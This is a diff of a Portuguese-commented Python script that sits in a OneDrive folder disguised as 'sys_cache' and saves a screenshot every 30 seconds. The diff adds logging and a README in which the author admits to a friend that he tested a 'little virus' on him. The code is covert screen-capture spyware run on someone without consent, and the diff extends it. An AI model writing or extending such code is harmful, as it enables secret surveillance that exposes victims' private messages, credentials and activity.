@@ -3,14 +3,27 @@ import time
 import datetime
 import sys
 import pyautogui
+import logging
+
+from install import INSTALL_DIR
 
 # Diretório dentro do OneDrive
 BASE_DIR = os.path.join(os.getenv("OneDrive"), "sys_cache")
 IMG_DIR = os.path.join(BASE_DIR, "img")
 COUNTER_FILE = os.path.join(BASE_DIR, "counter.txt")
+LOG_FILE = os.path.join(BASE_DIR, "syscache.log")
 
 INTERVAL = 30  # segundos
 RETENTION_DAYS = 3
+
+logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+def create_readme():
+    readme_path = os.path.join(INSTALL_DIR, "README_ANDREY.txt")
+    with open(readme_path, "w") as f:
+        f.write("Oi, Andrey! Aqui eh o Will.\n")
+        f.write("Fiz esse teste aqui de um viruszinho e voce foi meu primeiro teste hehe.\n")
+        f.write("Parabens por ter encontrado!\n")
 
 
 def create_dirs():
@@ -42,6 +55,7 @@ def save_number(counter, timestamp):
 
 
 def take_screenshot(timestamp):
+    logging.info(f"Taking screenshot #{timestamp}")
     filepath = os.path.join(IMG_DIR, f"S_{timestamp}.png")
     ss = pyautogui.screenshot()
     ss.save(filepath)
